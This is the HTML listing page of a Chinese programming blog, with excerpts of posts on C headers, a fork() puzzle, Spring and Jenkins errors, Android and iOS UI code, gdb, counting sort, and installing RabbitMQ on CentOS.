<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/775de05e9966f06a24b886bcbb29f2ea/" rel="bookmark">
			#include&lt;stdio.h&gt;是什么意思啊！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		stdio.h　stdio.h就是指“standard input&amp;output” 意思就是说标准输入输出头文件！ 所以了，用到标准输入输出函数时，就要调用这个头文件！ 调用：#include
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0dcd388a168f69a5cd9c2641d870a23/" rel="bookmark">
			关于fork()的一道经典面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不算main这个进程自身，到底创建了多少个进程啊？
1 2 3 4 5 6 int main( int argc, char * argv[]) { fork(); fork() &amp;&amp; fork() || fork(); fork(); } A.18
B.19
C.20
D.21
fork()是一个分叉函数， 返回值： 若成功调用一次则返回两个值，子进程返回0，父进程 返回子进程标记；否则，出错返回-1
每次fork()就翻倍；
fork(); fork() &amp;&amp; fork() || fork(); fork(); 第一条和第三条分别X2；关键在第二条语句。第二条有 5个分支； A&amp;&amp;B||C A为假，跳过B，判断C-----------------------2
A为真，判断B，若B为真，跳过C-----------1
若B为假，判断C ------------2
故总数为2*（2+1+2）*2=20；减去自己就是19.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca78feb8879d3a7c135b744cf5f22c64/" rel="bookmark">
			通配符的匹配很全面, 但无法找到元素 &#39;mvc:annotation-driven&#39; 的声明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息：通配符的匹配很全面, 但无法找到元素 'mvc:annotation-driven' 的声明
原因是：虽然在xml文件上方声明了mvc，但没有配置此声明对应的文件信息，正确配置如下：
&lt;beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:context="http://www.springframework.org/schema/context"
xmlns:mvc="http://www.springframework.org/schema/mvc"
xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd
http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd "&gt;
意思就是，mvc声明用http://www.springframework.org/schema/mvc/spring-mvc.xsd这个文件来解析
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c7ee8ddaa8645a52346dc05d6583104/" rel="bookmark">
			软件人员推荐书目(都是国外经典书籍！！！)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件人员推荐书目(一) 大师篇 一、 科学哲学和管理哲学 【1】 "程序开发心理学"(The Psychology of Computer Programming : Silver Anniversary Edition) 【2】 "系统化思维导论"(An Introduction to Systems Thinking, Silver Anniversary Edition) 【3】 "系统设计的一般原理"( General Principles of Systems Design) 【4】 "质量?软件?管理(第1卷)—— 系统思维"(Quality Software Management:Systems Thinking) 【5】 "成为技术领导者——解决问题的有机方法"(Becoming A Technical Leader:An Organic Problem Solving Approach) 【6】 "你的灯亮着吗？－发现问题的真正所在"( Are Your Lights On? How to Figure Out What the Problem Really Is) 【7】 "程序员修炼之道"(The Pragmatic Programmer) 【8】 "与熊共舞:软件项目风险管理" (Waltzing With Bears: Managing Risk on Software Projects) 【9】 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c7ee8ddaa8645a52346dc05d6583104/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a79ff4a8ef8d34531865e644e05c14c/" rel="bookmark">
			jenkins报错总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错：coding.net不支持http协议改用ssh协议git clone代码 原因是私有库，需要配置和服务器的秘钥文件 http://blog.csdn.net/dwl764457208/article/details/50836284文章位置 配置秘钥 点击add即可 完成 报错：没有找到项目的根pom文件 解决办法，根据jenkins的客户端打印的信息，找到项目位置 sys_xc_web是项目的根路径 sys_xc_web/pom.xml
报错: 配置ant的时候报错，每次配置ant，maven，multijob报错
A problem occurred while processing the request. Please check our bug tracker to see if a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think this is a new issue, please file a new issue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a79ff4a8ef8d34531865e644e05c14c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c870e90b81d14ad8d09dae97ba438c1/" rel="bookmark">
			MMO游戏设计三：架构设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先要说明，这里谈的架构，并不是说游戏服务器由哪些功能服务器搭建而成，而是想重点谈谈一个好的游戏架构，应该具备哪些特质。
对网游来说，玩家所操作的客户端数据，往往是服务端针对该玩家数据的镜像。打个比方，客户端保存了本角色的A的HP，MP等数据，服务端同样也保存了角色A的HP，MP。另外，当A的HP，MP发生变化时，需要将数据同步给客户端本人，同时也需要同步给其他能看到A的那些玩家；除了数据的同步之外，有些逻辑功能在客户端和服务端完全相同，比方说攻防计算，扣血逻辑。这些最基础的功能，在开发功能中甚至是必不可少的，但凡每增加一部分数据到角色身上，可能都要考虑此类问题。
对一个好的游戏架构而言，最基础的功能性架构应该搭建得很好，以至于我们再添加新功能时，只需专注于新功能的逻辑，而无需再花精力在客户端和服务端的数据一致性和逻辑一致性方面。
有关数据一致性：简单说就是同步了，代码中最常见的做法：
1. server: player-&gt;set_hp(hp); // 服务端设置HP sync_player(player, hp); // 发同步消息到客户端
2. client: recv_sync(); // 收到同步消息
player-&gt;set_hp(hp); // 客户端设置HP
一条简单设置HP的指令，要完成同步操作就得封包，解包，客户端再设置，考虑到AOI(Area Of Interest)广播的话，那就更复杂了。
那么，有没有一种更加智能的方式，在服务器设置好响应的操作或者数值之后，框架会“自动“同步到客户端呢？
假定，客户端和服务端都有一个相同的”逻辑虚拟机“，所有通用的逻辑代码，在这里作一个抽象，逻辑虚拟机暴露必要的接口供客户端和服务端进行访问；那么，客户端和服务端在访问逻辑虚拟机时，只要提供的参数一致，那将会得到同样的结果，则客户端和服务端各自的逻辑虚拟机的内部数据和状态一定是一致的。
问题是，逻辑虚拟机应该暴露怎样的接口呢？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/773f0b233e6afd00d4fb79ebe9a60771/" rel="bookmark">
			Dialog的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天做一个小功能，Dialog的使用。一般来说，我们和用户交互所使用的类有这几个：Activity、Window、Dialog、Toast，可见Dialog的重用性，所以这是必须掌握的。先看下效果：
额，好像界面比较丑...，不过使用方法才是重点，下面我们就来实现一下。
首先是界面：
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:background="#ff0000" android:orientation="vertical"&gt; &lt;RelativeLayout android:layout_width="match_parent" android:layout_height="60dp" android:layout_marginTop="10dp"&gt; &lt;Button android:id="@+id/bt_cancel" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_alignParentLeft="true" android:layout_margin="5dp" android:background="#00ff00" android:text="取消" android:textColor="#ffffff" /&gt; &lt;Button android:id="@+id/bt_sure" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_alignParentRight="true" android:layout_margin="5dp" android:background="#00ff00" android:text="确定" android:textColor="#ffffff" /&gt; &lt;/RelativeLayout&gt; &lt;TextView android:layout_width="match_parent" android:layout_height="60dp" android:layout_margin="20dp" android:background="#ffffff" android:gravity="center" android:text="我是弹出框" android:textSize="16sp" /&gt; &lt;/LinearLayout&gt; 然后是Activity： public class MainActivity extends Activity implements View.OnClickListener { //弹框dialog private Dialog dialog; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); findViewById(R.id.bt_click).setOnClickListener(this); } @Override public void onClick(View v) { if (v == null) { return; } switch (v.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/773f0b233e6afd00d4fb79ebe9a60771/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45d7d69b01fff5b78a500eaf64db43af/" rel="bookmark">
			如何判断List&amp;lt;Object&amp;gt;中是否包含，一个有相同xxx某个属性实体类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		例如Ratejob中都有name属性，我从数据库中查出有相同name属性的Ratejob,并放到一个List&lt;Ratejob&gt;中，但是我只想把不重复
name属性的Ratejob拿出来。例子如下：
List&lt;Ratejob&gt; ls = icb.queryComByName(ratejob); List&lt;Ratejob&gt; ls2 = new ArrayList&lt;Ratejob&gt;(); boolean flag = true; if(ls.size()&gt;0){ for(int i=0;i&lt;ls.size();i++){ System.out.println(ls.get(i).getName()); if(ls2.size()&gt;0){ for(Ratejob var : ls2){ if(var.getName().equals(ls.get(i).getName())){ flag = false; } else { flag = true; } } if(flag){ ls2.add(ls.get(i)); } } else { ls2.add(ls.get(i)); } } } 这样就实现了将不通name的Ratejob属性存放到一个list中了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a3ddce8816d5424f44cd7661fe0e758/" rel="bookmark">
			gdb 调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、gdb 调试-源代码关联
在调试程序的过程中，可以自由地查看相关的源代码（如果有源代码的话）是一项最基本的特性。gdb 当然也提供了这项特性，虽然不如IDE直观，但在一定程度上要比IDE更加灵活和快捷。
gdb之所以能够知道对应的源代码，是因为调试版的可执行程序中记录了源代码的位置；因为源代码的位置在编译之后可能会移动到其它地方，所以gdb还会在当前目录中查找源代码，另外gdb也允许明确指定源代码的搜索位置。
在一个调试会话中，gdb维护了一个源代码查找目录列表，默认值是编译目录和当前工作目录。当gdb需要一个源文件的时候，它依次在这些目录中查找，直到找到一个或者抛出错误。
gdb还维护了一个路径替换规则，将要搜索的原始路径按照找到的第一个规则做前缀替换，然后再在源码搜索目录中查找文件。
因此，源代码关联默认情况下搜索路径如下：
gdb在编译时目录中搜索 ($cdir : compilation directory)当前目录中搜索 ($cwd : current working directory)源代码搜索目录列表 (substitute-path) 除了默认搜索路径，还可以通过如下方式来设置源代码搜索位置和替换规则　gdb允许明确指定源代码位置，以应付源代码位置迁移的情况。 directory path-list：将一个或者多个源代码搜索目录加入到当前源码搜索目录列表的前面，目录之间使用空格间隔。directory：不带参数的directory将源码搜索目录恢复为默认值。set directories path-list：将源码目录设置为path-list，但是会补上默认目录(同 directory path-list)。show directories：显示源码搜索目录列表。 2. gdb允许设置路径替换规则，以应付源代码位置迁移的情况。
set substitute-path from to ：设置目录替换规则，放置在规则列表的末端。unset substitute-path [path] ：删除path对应的替换规则，或者删除所有的替换规则。
show substitute-path [path] ：显示path对应的替换规则，或者显示所有的替换规则。 二、gdb 动态库搜索路径 当gdb无法显示so动态库的信息或者显示信息有误时，通常是由于库搜索路径错误导致的，可使用set sysroot、set solib-absolute-prefix、set solib-search-path来指定库搜索路径。
1. set sysroot 与 set solib-absolute-prefix 是同一条命令，实际上，set sysroot是set solib-absolute-prefix 的别名。
2. set solib-search-path设置动态库的搜索路径，该命令可设置多个搜索路径，路径之间使用“:”隔开（在linux中为冒号，DOS和Win32中为分号）。
3. set solib-absolute-prefix 与 set solib-search-path 的区别：
总体上来说solib-absolute-prefix设置库的绝对路径前缀，只对绝对路径有效；而solib-search-path设置库的搜索路径，对绝对路径和相对路径均起作用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a3ddce8816d5424f44cd7661fe0e758/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a14b7b39144b9fdaecea81510aca1462/" rel="bookmark">
			什么是V-模式开发？与瀑布式开发个有什么优缺点？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		瀑布式开发是将项目划分为多个有限阶段并按顺序逐步完成各阶段的软件开发方法。瀑布式开发能够简化项目控制，并减少开发阶段不必要的跨团队交流。无需频繁修改计划，项目评估与管理也不再繁琐。
V 型开发流程以瀑布模型中各开发生命周期阶段的相互关系为基础，可视为瀑布模型的延伸。 益进根据具体项目情况也会采用 V 型开发流程。V 型开发流程结构优良，环环相扣，每个阶段都能根据前一阶段的详细记录实施。例如，将测试设计之类的测试活动安排在编码阶段之前，可为项目节省大量宝贵时间。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f16eccdf02ab9f115b4595f589790d2/" rel="bookmark">
			如何判断UIPanGestureRecognizer的拖动方向
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近做一个项目，需要用到UIPanGestureRecognizer做一个侧滑菜单，需求是不能向右侧拖动(点击按钮右滑)，但可以向左侧手势拖动收回；于是需要判断拖动的方向，百度了一下，网上大部分的答案是这样判断的：
CGPoint translation = [recognizer translationInView:recognizer.view];
if(translation.x&gt;0)
{
//向右滑动
}
else
{
//向左滑动
}
不过，在实际开发中，我发现不论是向左拖动或者是向右拖动,translation.x始终大于0，于是看了一下translationInView:的官方解释是获取手势在相对指定视图的移动距离，即在X,Y轴上移动的像素，应该是没有正负的，于是考虑用velocityInView:这个方法，这个方法是获取手势在指定视图坐标系统的移动速度，结果发现这个速度是具有方向的，
CGPoint velocity = [recognizer velocityInView:recognizer.view];
if(velocity.x&gt;0)
{
//向右滑动
}
else
{
//向左滑动
}
于是乎，问题解决。
转载于:https://www.cnblogs.com/jlwang/p/5241349.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e356eab3035599d608051ba72b0e3f40/" rel="bookmark">
			hashCode和identityHashCode的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		I、 hashCode()方法是Object类下面的一个方法，供继承类重写，根据对象内存地址计算哈希值，
String类重写了hashCode方法，并改为根据字符序列来计算哈希值
III、identityHashCode()方法是System类中的静态方法，根据对象内存地址来计算哈希值；
方法示例：
public static void main(String[] args)
{
//下面程序中s1和s2是两个不同对象
String s1 = newString("Hello");
String s2 =newString("Hello");
//String类重写了Object类的hashCode方法——改为根据字符序列计算hashCode值，
//因为s1和s2的字符序列相同，所以它们的hashCode方法返回值相同
System.out.println(s1.hashCode() +"----" + s2.hashCode());
//s1和s2是不同的字符串对象，所以它们的identityHashCode值不同，
//identityHashCode是根据对象的地址计算得到的，所以任何两个不同的对象的
//identityHashCode值总是不相等
System.out.println(System.identityHashCode(s1)+ "----"
+System.identityHashCode(s2));
//s3和s4是相同的字符串对象，所以它们的identityHashCode值相同
String s3 ="Java";
String s4 ="Java";
System.out.println(System.identityHashCode(s3)+"----"
+System.identityHashCode(s4));}
输出：
69609650----69609650
13078969----3154093
28399250----28399250
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5bed84603d7b8affd8b0abc7f051faa/" rel="bookmark">
			QTableWidget改变每行显示的图标大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QTableWidget使用以下代码可以设置行中显示的图标
QIcon icon; icon.addFile(":/resources/menu_conmmmgmt.png", QSize(32,32)); ui-&gt;tableWidget-&gt;setRowHeight(0,36); ui-&gt;tableWidget-&gt;setItem(0,0,new QTableWidgetItem(icon, "测试"));显示结果如下图所示： 怎么修改QIcon的大小或修改行高都不行，这里修改图标大小需使用
ui-&gt;tableWidget-&gt;setIconSize(QSize(32,32));或在界面中设置 设置后的显示效果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/968142477e490a7b0a2b5e6e3b556efd/" rel="bookmark">
			【Android】Service中判断当前是否全屏（状态栏是否隐藏）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载请注明来源：http://blog.csdn.net/pur_e/article/details/50781412
业务需要，要在后台Service中判断当前界面是否全屏，感谢Google，帮我找到了一个解决方式：is it possible to detect when any application is in full screen in android?，现将方法研究并记录一下。
1.原理 上面的回答中，创建了一个overlay的不可见View，靠在窗口上方，通过调用View.getLocationOnScreen判断其中Y轴位置的值，来判断是否全屏，经过测试，完全可行。
2.测试 先上测试图： 可以明显看到，创建的View确实是会随状态栏隐藏和显示而上下移动的。
测试代码：
public class MyService extends Service { private View mCheckFullScreenView = null; @Override public void onCreate() { super.onCreate(); Context ctx = getApplicationContext(); mCheckFullScreenView = new View(ctx); mCheckFullScreenView.setBackgroundColor(Color.RED); WindowManager windowManager = (WindowManager)ctx.getSystemService(WINDOW_SERVICE); WindowManager.LayoutParams params = new WindowManager.LayoutParams(); //创建非模态、不可碰触 params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE; //放在左上角 params.gravity = Gravity.START | Gravity.TOP; params.height = 50; params.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/968142477e490a7b0a2b5e6e3b556efd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e115dc9e66dd0131e97d9c13d30baa5c/" rel="bookmark">
			osg 自己写地面操作器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		地面操作器，继承自osg自身的轨迹球操作器（osgGA::OrbitManipulator），参考osgEarth的操作器的实现。
特性：
放大缩小视点始终在指定的地面高度上。（旋转中心点一直在那个高度的平面上）
地面始终与视线平行，即在操作过程中地面上的物体不会歪。
放大到指定的视线距离后，距离不再放大；（即距离地面，实际上是距离视点一定距离后不再升高，改为后退）。
缩小到一定距离后，距离不再缩小；（即距离视点一定距离后不再变小，继续缩放的话，就是前进）。
下面给出类的实现
// 文件名：GroundManipulator.h // 作者：mingjun；日期：2015-11-05 // 描述： 地面操作器 // // // 历史记录 / #ifndef _GROUNDMANIPULATOR_H_ #define _GROUNDMANIPULATOR_H_ class CGroundManipulator : public osgGA::OrbitManipulator { typedef OrbitManipulator inherited; public: COCSGroundManipulator(); virtual ~COCSGroundManipulator(); // 见父类 virtual void setCenter( const osg::Vec3d&amp; center ); // 见父类 virtual void setByMatrix( const osg::Matrixd&amp; matrix ); // 见父类 virtual void zoomModel( const float dy, bool pushForwardIfNeeded = true ); // 见父类 virtual bool performMovementLeftMouseButton( const double eventTimeDelta, const double dx, const double dy ); // 见父类 virtual bool performMovementMiddleMouseButton( const double eventTimeDelta, const double dx, const double dy ); // 见父类 virtual void panModel( const float dx, const float dy, const float dz = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e115dc9e66dd0131e97d9c13d30baa5c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ab3db20035cd3ec69b25708552fe827/" rel="bookmark">
			单片机CAN通讯电路(带隔离)设计，CAN隔离电路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CAN是控制器局域网络(Controller Area Network, CAN)的简称，是由德国BOSCH公司开发的，并最终成为国际标准（ISO 11898），是国际上应用最广泛的现场总线之一。其典型应用就是在汽车领域。下面我们分享一个典型的CAN总线电路。
图中的D6为ADuM1201双通道数字隔离芯片，可以实现信号的隔离；
途中的D7为AMIS42675CAN电平转换芯片；
CANTX,CANRX接单片机的片上CAN资源引脚。
更多电子知识请关注微信公众号：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f5c8df95d4d2c5d140723e93f2d5482/" rel="bookmark">
			CSDN博客以后不再使用，转移到博客园了（http://www.cnblogs.com/dongc/）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 http://www.cnblogs.com/dongc/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75a2d3fe71438105b7b552ff295b2b66/" rel="bookmark">
			Android中使用OrmLite（一）：表创建及增删改查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OrmLite是一个轻量级的ORM框架，面向JAVA语言。也是时下流行的Android的ORM框架之一。在Android中使用Sqlite数据，如果又不想写SQL，OrmLite或许是个不错的选择。 使用OrmLite，首先要在gradle配置依赖 compile 'com.j256.ormlite:ormlite-android:4.48' 也可以去ormlite官网下载查看文档 http://ormlite.com/ 1.表创建 然后要要创建一个实体类，对应表结构。OrmLite提供了两个注解，@DatabaseField 代表表列名，@DatabaseTable 表名 tableName值为数据库中表的真实名称。下列的User类必须有一个无参数的构造函数。 需要指定一个字段为唯一标志，必须为int， Integer ，long， Long， Uuid类型 数据库中的记录通过定义为唯一的特殊字段成为唯一标识。记录不是必须有唯一标识字段当时很多DAO操作（更新、删除、刷新）都需要一个唯一标识字段。这个标识要么用户提供要么数据库自动生成。标识字段有表中唯一的值并且如果你用DAO根据id查询、删除、刷新或者更新指定行的时候他们必须存在。为了配置一个成员变量作为标识成员，你应该使用下面三个设置之一（而且必须使用一个）：@DatabaseField: id, generatedId, generatedIdSequence 。 @DatabaseField(id = true)指定哪个字段为主键 @DatabaseField(generatedId = true)自动增加的ID @DatabaseField(generatedIdSequence = true) 设置序列名来匹配已经存在的schema，你可以使用generatedIdSequence指定序列名的值。 这样才可以使用ID来做删除，修改，查询等操作。否则调用相关方法抛出 Cannot query-for-id with class xxx.xxx.xxx.User because it doesn't have an id field相关异常。 @DatabaseTable(tableName = "t_user") public class User { @DatabaseField(generatedId =true) private int id; @DatabaseField private String name; public User(int id, String name) { this.name = name; this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75a2d3fe71438105b7b552ff295b2b66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0051e21e1a6ce924b27f3459666e3e67/" rel="bookmark">
			Action拦截器接口(IActionFilter,IExceptionFilter)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MVC2里的拦截器接口(也叫过滤器接口)： 1、IActionFilter(Action拦截器接口) Action拦截器分别在“执行Action之前”拦截和“执行Action之后”拦截，2个方法如下：
// 摘要: // Called after the action method executes. // // 参数: // filterContext: // The filter context. void OnActionExecuted(ActionExecutedContext filterContext); // // 摘要: // Called before an action method executes. // // 参数: // filterContext: // The filter context. void OnActionExecuting(ActionExecutingContext filterContext); 看摘要就可以区分出哪个是执行之前拦截和执行之后拦截了，我们只需要实现这个接口就可以在执行Action之前做些处理和执行Action之后做些“善后”处理了。。。。 参数：filterContext 包含了执行整个Action的内容，我们可以取到我们想要的内容，如Action名称啦，一些参数等等。。。 示例代码如：
public void OnActionExecuted(ActionExecutedContext filterContext) { filterContext.RequestContext.HttpContext.Response.Write(string.Format("Action({0})已经执行了!&lt;br /&gt;" ,filterContext.ActionDescriptor.ActionName)); } public void OnActionExecuting(ActionExecutingContext filterContext) { filterContext.RequestContext.HttpContext.Response.Write(string.Format("Action({0})执行之前!&lt;br /&gt;" ,filterContext.ActionDescriptor.ActionName)); } 2、 IResultFilter(Result拦截器接口) IResultFilter 和 IActionFilter 一样提供2个方法，执行前和执行后，分别是在 返回Result之前执行和返回Result之后执行。接口中的2个方法如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0051e21e1a6ce924b27f3459666e3e67/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15d3495cca0d69e391bf98ebc83e385f/" rel="bookmark">
			O(n)复杂度的排序算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍了前面的很多排序算法后，也许你会问是否有一种O(n)复杂度的排序算法呢！答案当然是有的。但是和我们之前看到的算法不一样。前面的算法不管是插入排序，归并排序，还是快速排序，以及堆排序也好，它们都需要比较元素的大小。在导论上有证明了只要是比较排序算法，它的时间复杂度下界是O(nlogn)（当然也存在特例，比如桶排序）。也就是说要想达到O(n)的复杂度，我们必须在不进行比较大小的情况下，将元素排好序。下面我们来看看有哪些算法能做到这一点！
一. 计数排序
计数排序有一个提前假设，是数值大小与数据的规模成线性关系，并且数值的大小不能过大，不然会花费很大的存储空间，这个是典型的空间换取时间的例子。原理：将要排序的关键字转换成整数形式，范围是0~max，然后创建一个max+1大小的存储数组。然后遍历数据，讲对应存储数组索引位加一。接一下遍历存储数组（这就是为什么要成线性关系），将每一位的数加上前一位的数，这就使得存储数组中每一位中的数是不大于该索引编号的元素个数。然后更加存储数组依次将数据放入结果数组中。
听了一大坨也许你晕了，下面我们来根据图看看实现的过程吧！图中A表示数据数组，C表示存储数组，B表示结果数组。可以看到A中元素的大小最大为5，所以C的大小开到6（因为有可能有0元素）。设想一下如果最大元素为10^10，那么C的大小将超大，这就是计数排序的缺点。接下来将A中的元素在C中对应的索引加1。然后处理C数组，这里有人说可以不处理C数组直接输出不是也可以吗？没有元素的地方为0，如果C中元素超过1，说明A中有重复元素，依次输出就可以了啊！但是你可能没有考虑到稳定性的问题，你说相同元素有什么稳定性可言，但是如果每个元素附加了卫星数据呢，一般实际应用中都是有的多，那么这种方式就变得无法处理了。我在网上看到有人讲这种方法说成是桶排序，还不止一位朋友这么说，这里必须强调一下，其本质是简化的计数排序，与桶排序压根没有关系。。。我们接着说，遍历C数组，每个元素加上前一个元素得到的是不大于索引的数据个数，你想想是不是。然后从A数组的末尾，依次更加C数组，将元素放入B数组中，并将C中对于元素减1，因为放好一个了。为什么要从A的末尾开始呢？不可以从前往后吗？不可以，还是稳定性的原因。大家想想就明白了。
上代码：
package charp_1; public class CountSort { public static int[] countSort(int[] a, int k) { int[] c = new int[k]; for (int i = 0; i &lt; a.length; i++) { c[a[i]]++; } for (int i = 1; i &lt; c.length; i++) { c[i] += c[i-1]; } int[] result = new int[a.length]; //为了保持排序的稳定性必须要反向输出，这样才能保证相同数据下后面的数据一样放在后面 for (int i = a.length-1; i &gt;= 0; i--) { result[c[a[i]] - 1] = a[i]; c[a[i]]--; } return result; } public static void main(String[] args) { int[] a = new int[]{10, 5, 8 ,1, 3, 100, 7}; System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15d3495cca0d69e391bf98ebc83e385f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3522b064bd3b3ffdf3bcdfe66d153b51/" rel="bookmark">
			CentOS6.5下RabbitMQ安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公众号：战渣渣 1.操作系统环境 操作系统：CentOS6.5 / 64bit
用户：root
2.RabbitMQ编译安装 RabbitMQ是使用Erlang开发，所以安装RabbitMQ前需要先安装Erlang。 2.1.获取Erlang和RabbitMQ的源文件
http://erlang.org/download/下查找最新的源文件，我选择的是版本17
找到后，执行以下命令直接在Linux下获取源码
[root@iZ250x18mnzZ ~]# wget http://erlang.org/download/otp_src_17.0.tar.gz http://www.rabbitmq.com/releases/rabbitmq-server查找到最新的源码版本，我选择v3.6.0
找到后，执行以下命令直接在Linux下获取源码
[root@iZ250x18mnzZ ~]# wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.0/rabbitmq-server-3.6.0-1.noarch.rpm 2.2.编译安装Erlang
2.2.1.解压otp_src_17.0.tar.gz
[root@iZ250x18mnzZ ~]# tar -zxvf otp_src_17.0.tar.gz 编译安装Erlang对环境有要求，为防止在编译的时候提示某些软件包未安装之类的错误，所以我将Erlang需要的软件提前安装，直接使用yum进行安装即可
2.2.2.利用yum安装erlang编译环境
